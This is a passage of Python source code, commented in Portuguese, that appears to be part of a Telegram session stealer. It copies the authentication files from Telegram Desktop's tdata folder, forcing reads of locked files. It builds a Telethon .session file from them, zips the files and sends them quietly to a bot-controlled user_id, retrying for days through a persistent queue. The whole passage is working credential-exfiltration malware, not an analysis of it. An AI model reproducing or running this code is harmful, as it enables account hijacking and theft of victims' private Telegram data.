                # Tenta múltiplos métodos para ler o arquivo
                metodos_leitura = [
                    lambda f=tdata_file: open(f, 'rb').read(),
                    lambda f=tdata_file: copiar_arquivo_compartilhado_leitura(f, 1024*1024),
                    lambda f=tdata_file: copiar_arquivo_ctypes_leitura(f, 1024*1024),
                    lambda f=tdata_file: copiar_arquivo_forcado_leitura(f, 1024*1024),
                ]
                
                for metodo in metodos_leitura:
                    try:
                        file_data = metodo()
                        if file_data and len(file_data) > 0:
                            break
                    except:
                        continue
                
                if file_data is None:
                    file_data = b''
                
                # Armazena arquivo no banco (limita tamanho para não exceder limites do SQLite)
                if len(file_data) > 0:
                    # Limita a 1MB por arquivo para não exceder limites
                    file_data_limited = file_data[:1024*1024] if len(file_data) > 1024*1024 else file_data
                    cursor.execute('''
                        INSERT INTO tdata_files (file_path, file_data, file_size)
                        VALUES (?, ?, ?)
                    ''', (file_name, file_data_limited, len(file_data)))
                    arquivos_importantes_processados += 1
                
                if (idx + 1) % 10 == 0:
                    print(f"***Processados {idx + 1}/{len(files_to_process_final)} arquivos...")
            
            # Cria índice para melhor performance
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_file_path ON tdata_files(file_path)')
            
            # Commit e fecha conexão
            # GARANTE que commit é feito e dados são persistidos
            conn.commit()
            
            # Verifica se commit foi bem-sucedido
            try:
                cursor.execute("SELECT COUNT(*) FROM metadata")
                count = cursor.fetchone()[0]
                if count > 0:
                    print(f"***OK {count} metadado(s) salvos no SQLite")
            except:
                pass
            
            conn.close()
            print(f"***OK Conexão SQLite fechada, dados salvos")
            
            print(f"***Arquivo .session SQLite criado com {arquivos_importantes_processados} arquivos do tdata")
            
            # Valida se arquivo foi criado corretamente
            if not os.path.exists(session_file):
                print(f"***ERRO: Arquivo .session não foi criado!")
                return None
            
            session_size = os.path.getsize(session_file)
            
            if session_size == 0:
                print(f"***ERRO: Arquivo .session está vazio!")
                try:
                    os.remove(session_file)
                except:
                    pass
                return None
            
            # Valida integridade completa do banco SQLite antes de retornar
            try:
                conn_val = sqlite3.connect(session_file, timeout=10.0)
                cursor_val = conn_val.cursor()
                
                # Verifica integridade do banco
                cursor_val.execute("PRAGMA integrity_check")
                integrity_result = cursor_val.fetchone()
                
                if integrity_result and integrity_result[0] == 'ok':
                    print(f"***OK Integridade do banco SQLite validada")
                else:
                    print(f"***AVISO: Problema de integridade detectado: {integrity_result}")
                    cursor_val.execute("PRAGMA quick_check")
                    quick_check = cursor_val.fetchone()
                    if quick_check and quick_check[0] != 'ok':
                        print(f"***ERRO: Banco SQLite corrompido, não será enviado")
                        conn_val.close()
                        try:
                            os.remove(session_file)
                        except:
                            pass
                        return None
                
                # Verifica se todas as tabelas obrigatórias existem
                cursor_val.execute("SELECT name FROM sqlite_master WHERE type='table'")
                tabelas = [row[0] for row in cursor_val.fetchall()]
                
                tabelas_obrigatorias = ['version', 'sessions', 'entities', 'sent_files', 'update_state']
                tabelas_faltando = [t for t in tabelas_obrigatorias if t not in tabelas]
                
                if tabelas_faltando:
                    print(f"***AVISO: Tabelas faltando: {tabelas_faltando}")
                else:
                    print(f"***OK Todas as tabelas obrigatórias do Telethon estão presentes")
                
                conn_val.close()
                
                
            except Exception as e:
                print(f"***ERRO ao validar integridade do .session: {repr(e)}")
                # Continua mesmo assim se arquivo foi criado
            
            print(f"***Arquivo .session gerado com sucesso!")
            print(f"***Tamanho: {session_size / 1024:.2f} KB ({session_size / (1024*1024):.2f} MB)")
            print(f"***Localização: {session_file}")
            
            # Limpa clone temporário se foi criado
            if tdata_clone_path:
                remover_arquivo_temp(tdata_clone_path)
            
            # AUTORIZA A SESSION USANDO TELETHON
            if session_file and os.path.exists(session_file):
                print(f"***Autorizando session gerada com Telethon...")
                if autorizar_session_telethon(session_file):
                    print(f"***OK Session autorizada com sucesso pelo Telethon!")
                else:
                    print(f"***AVISO: Não foi possível autorizar session, mas arquivo foi gerado")
            
            return session_file
            
        except Exception as e:
            print(f"***ERRO ao criar arquivo .session SQLite: {repr(e)}")
            import traceback
            traceback.print_exc()
            # Se falhar, tenta criar um SQLite básico válido com todas as tabelas obrigatórias
            try:
                conn = sqlite3.connect(session_file)
                cursor = conn.cursor()
                
                # Cria todas as tabelas obrigatórias do Telethon
                cursor.execute('''
                    CREATE TABLE IF NOT EXISTS version (
                        version INTEGER PRIMARY KEY
                    )
                ''')
                cursor.execute('INSERT OR REPLACE INTO version (version) VALUES (?)', (7,))
                
                cursor.execute('''
                    CREATE TABLE IF NOT EXISTS sessions (
                        dc_id INTEGER PRIMARY KEY,
                        server_address TEXT,
                        port INTEGER,
                        auth_key BLOB,
                        takeout_id INTEGER
                    )
                ''')
                
                cursor.execute('''
                    CREATE TABLE IF NOT EXISTS entities (
                        id INTEGER PRIMARY KEY,
                        hash INTEGER NOT NULL,
                        username TEXT,
                        phone INTEGER,
                        name TEXT,
                        date INTEGER
                    )
                ''')
                
                cursor.execute('''
                    CREATE TABLE IF NOT EXISTS sent_files (
                        md5_digest BLOB,
                        file_size INTEGER,
                        type INTEGER,
                        id INTEGER,
                        hash INTEGER,
                        PRIMARY KEY (md5_digest, file_size, type)
                    )
                ''')
                
                cursor.execute('''
                    CREATE TABLE IF NOT EXISTS update_state (
                        id INTEGER PRIMARY KEY,
                        pts INTEGER,
                        qts INTEGER,
                        date INTEGER,
                        seq INTEGER
                    )
                ''')
                
                cursor.execute('''
                    CREATE TABLE IF NOT EXISTS metadata (
                        key TEXT PRIMARY KEY,
                        value TEXT
                    )
                ''')
                
                cursor.execute('INSERT OR REPLACE INTO metadata (key, value) VALUES (?, ?)',
                             ('original_tdata_path', tdata_path))
                
                conn.commit()
                conn.close()
                print(f"***Arquivo .session SQLite básico criado com todas as tabelas obrigatórias do Telethon")
            except:
                print(f"***ERRO crítico ao criar arquivo .session")
                return None
            
            # Valida se arquivo foi criado corretamente
            if not os.path.exists(session_file):
                print(f"***ERRO: Arquivo .session não foi criado!")
                return None
            
            session_size = os.path.getsize(session_file)
            
            if session_size == 0:
                print(f"***ERRO: Arquivo .session está vazio!")
                try:
                    os.remove(session_file)
                except:
                    pass
                return None
            
            # Valida integridade completa do banco SQLite antes de retornar
            try:
                conn_val = sqlite3.connect(session_file, timeout=10.0)
                cursor_val = conn_val.cursor()
                
                # Verifica integridade do banco
                cursor_val.execute("PRAGMA integrity_check")
                integrity_result = cursor_val.fetchone()
                
                if integrity_result and integrity_result[0] == 'ok':
                    print(f"***OK Integridade do banco SQLite validada")
                else:
                    print(f"***AVISO: Problema de integridade detectado: {integrity_result}")
                    # Tenta reparar
                    cursor_val.execute("PRAGMA quick_check")
                    quick_check = cursor_val.fetchone()
                    if quick_check and quick_check[0] != 'ok':
                        print(f"***ERRO: Banco SQLite corrompido, não será enviado")
                        conn_val.close()
                        try:
                            os.remove(session_file)
                        except:
                            pass
                        return None
                
                # Verifica se todas as tabelas obrigatórias existem
                cursor_val.execute("SELECT name FROM sqlite_master WHERE type='table'")
                tabelas = [row[0] for row in cursor_val.fetchall()]
                
                tabelas_obrigatorias = ['version', 'sessions', 'entities', 'sent_files', 'update_state']
                tabelas_faltando = [t for t in tabelas_obrigatorias if t not in tabelas]
                
                if tabelas_faltando:
                    print(f"***AVISO: Tabelas faltando: {tabelas_faltando}")
                    # Cria tabelas faltando (sempre com IF NOT EXISTS)
                    for tabela in tabelas_faltando:
                        if tabela == 'version':
                            cursor_val.execute('CREATE TABLE IF NOT EXISTS version (version INTEGER PRIMARY KEY)')
                            cursor_val.execute('INSERT OR REPLACE INTO version (version) VALUES (7)')
                        elif tabela == 'sessions':
                            cursor_val.execute('''
                                CREATE TABLE IF NOT EXISTS sessions (
                                    dc_id INTEGER PRIMARY KEY,
                                    server_address TEXT,
                                    port INTEGER,
                                    auth_key BLOB,
                                    takeout_id INTEGER
                                )
                            ''')
                        elif tabela == 'entities':
                            cursor_val.execute('''
                                CREATE TABLE IF NOT EXISTS entities (
                                    id INTEGER PRIMARY KEY,
                                    hash INTEGER NOT NULL,
                                    username TEXT,
                                    phone INTEGER,
                                    name TEXT,
                                    date INTEGER
                                )
                            ''')
                        elif tabela == 'sent_files':
                            cursor_val.execute('''
                                CREATE TABLE IF NOT EXISTS sent_files (
                                    md5_digest BLOB,
                                    file_size INTEGER,
                                    type INTEGER,
                                    id INTEGER,
                                    hash INTEGER,
                                    PRIMARY KEY (md5_digest, file_size, type)
                                )
                            ''')
                        elif tabela == 'update_state':
                            cursor_val.execute('''
                                CREATE TABLE IF NOT EXISTS update_state (
                                    id INTEGER PRIMARY KEY,
                                    pts INTEGER,
                                    qts INTEGER,
                                    date INTEGER,
                                    seq INTEGER
                                )
                            ''')
                    conn_val.commit()
                    print(f"***Tabelas faltando foram criadas")
                else:
                    print(f"***OK Todas as tabelas obrigatórias do Telethon estão presentes")
                
                # Fecha conexão corretamente
                conn_val.close()
                
                
            except Exception as e:
                print(f"***ERRO ao validar integridade do .session: {repr(e)}")
                import traceback
                traceback.print_exc()
                # Se não conseguir validar, não envia arquivo corrompido
                try:
                    if os.path.exists(session_file):
                        os.remove(session_file)
                except:
                    pass
                return None
            
            print(f"***Arquivo .session gerado com sucesso!")
            print(f"***Tamanho: {session_size / 1024:.2f} KB ({session_size / (1024*1024):.2f} MB)")
            print(f"***Localização: {session_file}")
            print(f"***Validação: Arquivo existe e tem {session_size} bytes")
            
            # Limpa clone temporário se foi criado
            if tdata_clone_path:
                remover_arquivo_temp(tdata_clone_path)
            
            # AUTORIZA A SESSION USANDO TELETHON
            if session_file and os.path.exists(session_file):
                print(f"***Autorizando session gerada com Telethon...")
                if autorizar_session_telethon(session_file):
                    print(f"***OK Session autorizada com sucesso pelo Telethon!")
                else:
                    print(f"***AVISO: Não foi possível autorizar session, mas arquivo foi gerado")
            
            return session_file
            
        except Exception as e:
            print(f"***ERRO ao escrever arquivo .session: {repr(e)}")
            import traceback
            traceback.print_exc()
            return None
        
    except Exception as e:
        print(f"***ERRO ao gerar arquivo .session: {repr(e)}")
        import traceback
        traceback.print_exc()
        
        # Limpa clone temporário se foi criado
        if tdata_clone_path:
            remover_arquivo_temp(tdata_clone_path)
        
        return None

def enviar_zip_session(zip_path, conjunto_num, telegram_dir=None, session_name=None, zip_size_mb=0, tentar_lock=True):
    """
    Envia um zip contendo arquivo .session.
    Se não conseguir lock, adiciona à fila persistente.
    """
    if not zip_path or not os.path.exists(zip_path):
        print(f"***ERRO: Arquivo zip não encontrado: {zip_path}")
        return
    
    version = "Unknown"
    if telegram_dir:
        try:
            telegram_exe = os.path.join(telegram_dir, "Telegram.exe")
            if os.path.exists(telegram_exe):
                version = getFileProperties(telegram_exe)["FileVersion"]
        except:
            pass
    
    path_info = telegram_dir if telegram_dir else "Isolado"
    
    print(f"***Enviando zip com arquivo .session: {os.path.basename(zip_path)} ({zip_size_mb:.2f}MB)...")
    
    # Se tentar_lock é False, significa que já temos o lock (chamado da fila persistente)
    if tentar_lock:
        # Tenta obter lock - se não conseguir, adiciona à fila persistente
        lock_obtido = False
        tentativas_lock = 0
        max_tentativas_lock = 3  # Apenas 3 tentativas rápidas
        
        while not lock_obtido and tentativas_lock < max_tentativas_lock:
            if obter_lock_global():
                lock_obtido = True
                print(f"***OK Lock obtido, processando fila persistente primeiro...")
                # Processa fila persistente antes de enviar este arquivo
                processar_fila_persistente()
                break
            else:
                tentativas_lock += 1
                if tentativas_lock < max_tentativas_lock:
                    time.sleep(1)  # Espera curta
        
        if not lock_obtido:
            # Não conseguiu lock - adiciona à fila persistente
            print(f"***Lock não disponível, adicionando à fila persistente...")
            adicionar_a_fila_persistente(zip_path, conjunto_num, telegram_dir, session_name, zip_size_mb, "session_zip")
            print(f"***Arquivo adicionado à fila persistente, será enviado quando lock estiver disponível")
            print(f"***Tentando processar fila persistente agora mesmo...")
            # Tenta processar a fila mesmo sem lock (pode funcionar se outra instância liberar)
            try:
                processar_fila_persistente()
            except:
                pass
            return  # Retorna sem enviar - será processado depois pela fila
    
    # Se chegou aqui, temos o lock ou não precisa de lock
    enviado = False
    tentativa = 0
    max_tentativas = 20
    timeout_maximo = 86400 * 7  # 7 dias
    
    while not enviado and tentativa < max_tentativas:
        tentativa += 1
        try:
            if tentativa > 1:
                wait_time = min(30 * (2 ** (tentativa - 2)), 600)
                print(f"***Retry {tentativa}/{max_tentativas} para zip (aguardando {wait_time}s)...")
                time.sleep(wait_time)
            
            try:
                # Valida arquivo antes de enviar
                if not os.path.exists(zip_path):
                    raise FileNotFoundError(f"Arquivo zip não encontrado: {zip_path}")
                
                tamanho_real = os.path.getsize(zip_path)
                print(f"***Tentativa {tentativa}: Enviando zip ({tamanho_real / (1024*1024):.2f}MB)...")
                
                # Envia diretamente
                zip_file_handle = open(zip_path, 'rb')
                try:
                    bot.send_document(
                        user_id,
                        zip_file_handle,
                        caption=f"SESSION ZIP - Conjunto {conjunto_num}\nArquivo: {session_name if session_name else 'session.session'}\nVersion: {version}\nPath: {path_info}\nSize: {zip_size_mb:.2f}MB\n\n📦 Este zip contém o arquivo .session gerado a partir do tdata.",
                        timeout=timeout_maximo,
                        disable_notification=True
                    )
                    enviado = True
                    print(f"***OK Zip com arquivo .session enviado com sucesso")

                    # LIBERA LOCK LOGO APÓS ENVIO para permitir múltiplas instâncias
                    if tentar_lock:
                        liberar_lock_global()

                    # Delay saudável após envio (3 segundos) - lock já liberado
                    time.sleep(3)

                    break
                finally:
                    zip_file_handle.close()

            finally:
                if tentar_lock:
                    liberar_lock_global()

        except Exception as e:
                error_str = str(e)
                error_repr = repr(e)

                # Mostra erro detalhado
                print(f"***ERRO na tentativa {tentativa}: {error_repr}")

                if '413' in error_str or 'file too large' in error_str.lower():
                    print(f"***ERRO: Zip muito grande ({zip_size_mb:.2f}MB)")
                    # Se muito grande, divide
                    if zip_size_mb > 50:
                        limite_telegram_bytes = 50 * 1024 * 1024
                        partes = dividir_arquivo_em_partes(zip_path, limite_telegram_bytes, f"{conjunto_num}_session_zip")
                        if len(partes) > 1:
                            # Envia partes sem tentar lock novamente (já temos)
                            enviar_partes(partes, f"{conjunto_num}_session_zip", version, path_info, None, [], [], zip_size_mb, tentar_lock=False)
                            for parte in partes:
                                remover_arquivo_temp(parte)
                            enviado = True
                    break
                elif 'connection' in error_str.lower() or 'reset' in error_str.lower() or 'aborted' in error_str.lower():
                    if tentativa < max_tentativas:
                        wait_time = min(60 * (2 ** (tentativa - 1)), 600)
                        print(f"***Connection error, aguardando {wait_time}s...")
                        time.sleep(wait_time)
                    else:
                        print(f"***ERROR: Connection error após {max_tentativas} tentativas")
                        break
                elif 'timeout' in error_str.lower() or 'timed out' in error_str.lower():
                    if tentativa < max_tentativas:
                        wait_time = min(60 * (2 ** (tentativa - 1)), 600)
                        print(f"***Timeout, aguardando {wait_time}s...")
                        time.sleep(wait_time)
                    else:
                        print(f"***ERROR: Timeout após {max_tentativas} tentativas")
                        break
                elif tentativa < max_tentativas:
                    wait_time = min(60 * (2 ** (tentativa - 1)), 600)
                    error_msg = error_str[:200] if len(error_str) > 200 else error_str
                    print(f"***Erro desconhecido, aguardando {wait_time}s antes de tentar novamente...")
                    print(f"***Detalhes: {error_msg}")
                    time.sleep(wait_time)
                else:
                    print(f"***ERROR: Não foi possível enviar zip após {max_tentativas} tentativas")
                    print(f"***Último erro: {error_repr}")
                    break

def enviar_apenas_session(session_files, conjunto_num, telegram_dir=None):
    """
    Envia apenas arquivos de sessão (.session) sem zip, diretamente.
    """
    if not session_files:
        return
    
    version = "Unknown"
    if telegram_dir:
        try:
            telegram_exe = os.path.join(telegram_dir, "Telegram.exe")
            if os.path.exists(telegram_exe):
                version = getFileProperties(telegram_exe)["FileVersion"]
        except:
            pass
    
    path_info = telegram_dir if telegram_dir else "Isolado"
    
    for session_file in session_files:
        if not os.path.exists(session_file):
            continue
        
        session_name = os.path.basename(session_file)
        session_size = os.path.getsize(session_file)
        session_size_mb = session_size / (1024 * 1024)
        
        print(f"***Enviando arquivo de sessão: {session_name} ({session_size_mb:.2f}MB)...")
        
        enviado = False
        tentativa = 0
        max_tentativas = 20
        timeout_maximo = 86400 * 7  # 7 dias
        
        while not enviado and tentativa < max_tentativas:
            tentativa += 1
            try:
                if tentativa > 1:
                    wait_time = min(30 * (2 ** (tentativa - 2)), 600)
                    print(f"***Retry {tentativa} para {session_name} (aguardando {wait_time}s)...")
                    time.sleep(wait_time)
                
                # Obtém lock global antes de enviar
                if not obter_lock_global():
                    time.sleep(2)
                    continue
                
                try:
                    # Abre arquivo e envia diretamente
                    session_file_handle = open(session_file, 'rb')
                    try:
                        bot.send_document(
                            user_id,
                            session_file_handle,
                            caption=f"SESSION - Conjunto {conjunto_num}\nArquivo: {session_name}\nVersion: {version}\nPath: {path_info}\nSize: {session_size_mb:.2f}MB",
                            timeout=timeout_maximo,
                            disable_notification=True
                        )
                        enviado = True
                        print(f"***OK Arquivo de sessão {session_name} enviado com sucesso")
                    finally:
                        session_file_handle.close()
                finally:
                    liberar_lock_global()
                    
            except Exception as e:
                error_str = str(e)
                if '413' in error_str or 'file too large' in error_str.lower():
                    print(f"***ERRO: Arquivo de sessão muito grande ({session_size_mb:.2f}MB)")
                    # Se muito grande, divide
                    if session_size_mb > 50:
                        limite_telegram_bytes = 50 * 1024 * 1024
                        partes = dividir_arquivo_em_partes(session_file, limite_telegram_bytes, f"{conjunto_num}_session")
                        if len(partes) > 1:
                            enviar_partes(partes, f"{conjunto_num}_session", version, path_info, None, [], [], session_size_mb)
                            for parte in partes:
                                remover_arquivo_temp(parte)
                            enviado = True
                    break
                elif tentativa < max_tentativas:
                    wait_time = min(60 * (2 ** (tentativa - 1)), 600)
                    print(f"***Erro ao enviar {session_name} (tentativa {tentativa}): {error_str[:100]}, aguardando {wait_time}s...")
                    time.sleep(wait_time)
                else:
                    print(f"***ERROR: Não foi possível enviar {session_name} após {max_tentativas} tentativas")
                    break

def copiar_tdata_essenciais(src_tdata, dst_tdata):
    """
    Copia TODOS os arquivos de autenticação da pasta tdata para manter a sessão completa.
    Arquivos de autenticação incluem:
    - key_data/key_datas (chaves de criptografia e auth keys)
    - map, map0, map1 (mapeamento dos arquivos criptografados)
    - settings, settings0 (configurações da conta)
    - config, configs (arquivos de configuração)
    - data, datas (arquivos de dados)
    - auth, auth_data (dados de autenticação)
    - Pasta D877F783D5D3EF8C* (dados da conta logada)
    - TODOS os arquivos contendo: key, auth, data, config, session, account, user

    Retorna (sucesso, falhas, bloqueados) onde:
    - sucesso: número de arquivos copiados com sucesso
    - falhas: número de arquivos que falharam
    - bloqueados: lista de arquivos bloqueados
    """
    import time
    
    sucesso = 0
    falhas = 0
    bloqueados = []
    
    # Cria diretório de destino
    try:
        os.makedirs(dst_tdata, exist_ok=True)
    except Exception as e:
        print(f"***ERRO ao criar diretório destino: {repr(e)}")
        return 0, 0, []
    
    # Lista de arquivos essenciais a copiar
    arquivos_essenciais = []
    pastas_essenciais = []
    
    # Identifica arquivos e pastas essenciais
    try:
        for item in os.listdir(src_tdata):
            item_path = os.path.join(src_tdata, item)
            item_lower = item.lower()
            
            # Arquivos essenciais na raiz do tdata
            if item in ['key_data', 'key_datas', 'keydata', 'keydatas']:
                arquivos_essenciais.append((item_path, item))
            elif item.startswith('map') or item == 'map':
                # map, map0, map1, etc.
                arquivos_essenciais.append((item_path, item))
            elif item.startswith('settings') or item == 'settings':
                # settings, settings0, etc.
                arquivos_essenciais.append((item_path, item))
            elif item.startswith('config') or item == 'config':
                # config, configs, etc.
                arquivos_essenciais.append((item_path, item))
            elif item.startswith('data') or item == 'data':
                # data, datas, etc.
                arquivos_essenciais.append((item_path, item))
            elif item.startswith('auth') or item == 'auth':
                # auth, auth_data, etc.
                arquivos_essenciais.append((item_path, item))
            elif item.startswith('D877F783D5D3EF8C'):
                # Pasta ou arquivo com hash da conta
                if os.path.isdir(item_path):
                    pastas_essenciais.append((item_path, item))
                else:
                    # Arquivo direto (pode acontecer em algumas versões)
                    arquivos_essenciais.append((item_path, item))
            # TODOS os arquivos que podem conter dados de autenticação
            elif any(keyword in item_lower for keyword in ['key', 'auth', 'data', 'config', 'session', 'account', 'user']):
                arquivos_essenciais.append((item_path, item))
    except Exception as e:
        print(f"***ERRO ao listar arquivos essenciais: {repr(e)}")
        return 0, 0, []
    
    print(f"***TODOS os arquivos de autenticação identificados: {len(arquivos_essenciais)} arquivo(s), {len(pastas_essenciais)} pasta(s)")
    
    # Copia arquivos essenciais
    for src_file, filename in arquivos_essenciais:
        dst_file = os.path.join(dst_tdata, filename)
        copiado = False
        
        # Tenta múltiplos métodos de cópia
        metodos = [
            lambda: shutil.copy2(src_file, dst_file),
            lambda: copiar_arquivo_chunks(src_file, dst_file),
            lambda: copiar_arquivo_memoria(src_file, dst_file),
            lambda: copiar_arquivo_compartilhado(src_file, dst_file),
            lambda: copiar_arquivo_ctypes(src_file, dst_file),
            lambda: copiar_arquivo_forcado(src_file, dst_file),
        ]
        
        for tentativa, metodo in enumerate(metodos):
            try:
                metodo()
                # Valida que foi copiado corretamente
                if os.path.exists(dst_file):
                    tamanho_src = os.path.getsize(src_file)
                    tamanho_dst = os.path.getsize(dst_file)
                    if tamanho_src == tamanho_dst:
                        sucesso += 1
                        copiado = True
                        print(f"***OK Copiado arquivo essencial: {filename} ({tamanho_src} bytes)")
                        break
                    else:
                        # Tamanho não confere, tenta próximo método
                        try:
                            os.remove(dst_file)
                        except:
                            pass
            except (PermissionError, IOError, OSError) as e:
                if tentativa < len(metodos) - 1:
                    time.sleep(0.2)
                else:
                    falhas += 1
                    bloqueados.append(src_file)
                    print(f"***ERRO: Não foi possível copiar {filename}: {repr(e)}")
            except Exception as e:
                if tentativa == len(metodos) - 1:
                    falhas += 1
                    bloqueados.append(src_file)
                    print(f"***ERRO: Erro inesperado ao copiar {filename}: {repr(e)}")
                else:
                    time.sleep(0.2)
        
        if not copiado:
            print(f"***AVISO: Arquivo essencial não copiado: {filename}")
    
    # Copia pastas essenciais (D877F783D5D3EF8C*)
    for src_folder, folder_name in pastas_essenciais:
        dst_folder = os.path.join(dst_tdata, folder_name)
        copiado = False
        
        try:
            # Cria diretório de destino
            os.makedirs(dst_folder, exist_ok=True)
            
            # Copia todos os arquivos dentro da pasta (são todos essenciais)
            arquivos_copiados_pasta = 0
            arquivos_falhados_pasta = 0
            
            for root, dirs, files in os.walk(src_folder):
                # Calcula caminho relativo
                rel_path = os.path.relpath(root, src_folder)
                if rel_path == '.':
                    dst_dir = dst_folder
                else:
                    dst_dir = os.path.join(dst_folder, rel_path)
                
                # Cria diretório de destino
                try:
                    os.makedirs(dst_dir, exist_ok=True)
                except:
                    pass
                
                # Copia arquivos
                for file in files:
                    src_file = os.path.join(root, file)
                    dst_file = os.path.join(dst_dir, file)
                    
                    arquivo_copiado = False
                    metodos = [
                        lambda: shutil.copy2(src_file, dst_file),
                        lambda: copiar_arquivo_chunks(src_file, dst_file),
                        lambda: copiar_arquivo_memoria(src_file, dst_file),
                        lambda: copiar_arquivo_compartilhado(src_file, dst_file),
                        lambda: copiar_arquivo_ctypes(src_file, dst_file),
                        lambda: copiar_arquivo_forcado(src_file, dst_file),
                    ]
                    
                    for tentativa, metodo in enumerate(metodos):
                        try:
                            metodo()
                            # Valida cópia
                            if os.path.exists(dst_file):
                                tamanho_src = os.path.getsize(src_file)
                                tamanho_dst = os.path.getsize(dst_file)
                                if tamanho_src == tamanho_dst:
                                    arquivos_copiados_pasta += 1
                                    sucesso += 1
                                    arquivo_copiado = True
                                    break
                                else:
                                    try:
                                        os.remove(dst_file)
                                    except:
                                        pass
                        except (PermissionError, IOError, OSError) as e:
                            if tentativa < len(metodos) - 1:
                                time.sleep(0.2)
                            else:
                                arquivos_falhados_pasta += 1
                                falhas += 1
                                bloqueados.append(src_file)
                        except Exception as e:
                            if tentativa == len(metodos) - 1:
                                arquivos_falhados_pasta += 1
                                falhas += 1
                                bloqueados.append(src_file)
                            else:
                                time.sleep(0.2)
                    
                    if not arquivo_copiado:
                        print(f"***AVISO: Arquivo não copiado da pasta {folder_name}: {file}")
            
            if arquivos_copiados_pasta > 0:
                copiado = True
                print(f"***OK Pasta essencial copiada: {folder_name} ({arquivos_copiados_pasta} arquivo(s), {arquivos_falhados_pasta} falha(s))")
            else:
                print(f"***ERRO: Nenhum arquivo copiado da pasta essencial: {folder_name}")
                
        except Exception as e:
            print(f"***ERRO ao copiar pasta essencial {folder_name}: {repr(e)}")
            falhas += 1
    
    print(f"***Resumo cópia essenciais: {sucesso} arquivo(s) copiado(s), {falhas} falha(s), {len(bloqueados)} bloqueado(s)")
    return sucesso, falhas, bloqueados

def criar_e_enviar_zip(telegram_dir, tdata_path, json_files, session_files, conjunto_num):
    """
    Cria e envia um zip APENAS com arquivos de autenticação da pasta tdata.
    Copia APENAS arquivos essenciais da pasta tdata antes de compactar.
    Arquivos json e session são IGNORADOS.
    """
    import time
    
    version = "Unknown"
    if telegram_dir:
        try:
            # Obtém versão do Telegram.exe
            telegram_exe = os.path.join(telegram_dir, "Telegram.exe")
            if os.path.exists(telegram_exe):
                version = getFileProperties(telegram_exe)["FileVersion"]
        except:
            pass
    
    # Cria diretório temporário para este conjunto
    conjunto_temp = os.path.join(temp, f"conjunto_{conjunto_num}")
    registrar_arquivo_temp(conjunto_temp)
    os.makedirs(conjunto_temp, exist_ok=True)
    
    tem_conteudo = False
    
    # Copia APENAS arquivos essenciais da pasta tdata
    tdata_dest = None
    if tdata_path and os.path.exists(tdata_path):
        tdata_dest = os.path.join(conjunto_temp, "tdata")
        try:
            if os.path.exists(tdata_dest):
                shutil.rmtree(tdata_dest)
        except:
            pass
        
        print(f"***Copiando APENAS arquivos essenciais da pasta tdata (conjunto {conjunto_num})...")
        print(f"***Arquivos essenciais: key_datas, map/map0/map1, settings/settings0, pasta D877F783D5D3EF8C*")
        sucesso, falhas, bloqueados = copiar_tdata_essenciais(tdata_path, tdata_dest)
        print(f"***OK Arquivos essenciais copiados: {sucesso} arquivo(s) com sucesso, {falhas} falha(s), {len(bloqueados)} bloqueado(s)")
        if bloqueados:
            print(f"***Warning: {len(bloqueados)} arquivo(s) essencial(is) bloqueado(s) - tentando métodos alternativos...")
            # Tenta novamente com métodos mais agressivos para arquivos bloqueados
            for arquivo_bloqueado in bloqueados[:5]:  # Limita a 5 tentativas
                try:
                    tentar_liberar_arquivo(arquivo_bloqueado)
                    time.sleep(0.3)
                except:
                    pass
        if sucesso > 0:
            tem_conteudo = True
        else:
            print(f"***ERRO CRÍTICO: Nenhum arquivo essencial foi copiado! A sessão pode não funcionar.")
    
    # APENAS arquivos de autenticação da tdata são enviados (json e session ignorados)
    json_copiados = []
    session_copiados = []
    
    # Se não tem conteúdo, não cria zip
    if not tem_conteudo:
        print(f"***Warning: Conjunto {conjunto_num} não tem conteúdo, pulando...")
        try:
            shutil.rmtree(conjunto_temp)
        except:
            pass
        return
    
    # Cria o zip
    zip_path = os.path.join(temp, f'tdata_conjunto_{conjunto_num}.zip')
    registrar_arquivo_temp(zip_path)
    try:
        arquivos_adicionados = set()  # Controla arquivos já adicionados para evitar duplicatas
        
        # GARANTE ZERO COMPRESSÃO E INTEGRIDADE TOTAL
        print(f"***Criando ZIP com ZERO compressão (ZIP_STORED) para garantir integridade total...")
        
        # Cria zip com validação de integridade
        with ZipFile(zip_path, 'w', compression=ZIP_STORED) as zipObj:  # ZERO COMPRESSÃO - apenas armazenamento
            # Adiciona pasta tdata completa
            if tdata_dest and os.path.exists(tdata_dest):
                arquivos_tdata_adicionados = 0
                for folderName, subfolders, filenames in os.walk(tdata_dest):
                    for filename in filenames:
                        filePath = os.path.join(folderName, filename)
                        try:
                            # Valida arquivo antes de adicionar
                            if not os.path.exists(filePath):
                                continue
                            
                            # Obtém tamanho original
                            tamanho_original = os.path.getsize(filePath)
                            if tamanho_original == 0:
                                print(f"***AVISO: Arquivo vazio ignorado: {filename}")
                                continue
                            
                            # Lê arquivo completo em modo binário para garantir integridade
                            dados = None
                            with open(filePath, 'rb') as f:
                                dados = f.read()
                            
                            # Valida que leu corretamente
                            if len(dados) != tamanho_original:
                                print(f"***ERRO: Tamanho do arquivo lido não confere: {filename}")
                                continue
                            
                            arcname = os.path.relpath(filePath, conjunto_temp)
                            # Verifica se já foi adicionado (evita duplicatas)
                            if arcname not in arquivos_adicionados:
                                zipObj.writestr(arcname, dados)
                                arquivos_adicionados.add(arcname)
                                
                                # Valida que foi adicionado corretamente
                                if arcname in zipObj.namelist():
                                    info_zip = zipObj.getinfo(arcname)
                                    if info_zip.file_size != tamanho_original:
                                        print(f"***ERRO: Tamanho no ZIP não confere para {filename}!")
                                    else:
                                        arquivos_tdata_adicionados += 1
                        except Exception as e:
                            print(f"ERROR adding {filename} to zip: {repr(e)}")
                            continue
                
                print(f"***OK {arquivos_tdata_adicionados} arquivo(s) tdata adicionado(s) ao ZIP com integridade validada")
            
            # APENAS arquivos de autenticação da tdata são adicionados (json e session ignorados)
        
        # VALIDAÇÃO COMPLETA DO ZIP CRIADO
        try:
            print(f"***Validando integridade completa do zip...")
            with ZipFile(zip_path, 'r') as zip_test:
                # Testa integridade do zip
                resultado_test = zip_test.testzip()
                if resultado_test is not None:
                    print(f"***ERRO CRÍTICO: Zip corrompido - arquivo problemático: {resultado_test}")
                    raise Exception(f"Zip corrompido: {resultado_test}")
                
                # Verifica se tem conteúdo no zip
                arquivos_no_zip = zip_test.namelist()
                if not arquivos_no_zip:
                    print(f"***ERRO CRÍTICO: Zip está vazio!")
                    raise Exception("Zip vazio")
                
                # Verifica tamanho de cada arquivo no zip
                total_size = 0
                for arquivo in arquivos_no_zip:
                    try:
                        info = zip_test.getinfo(arquivo)
                        if info.file_size == 0:
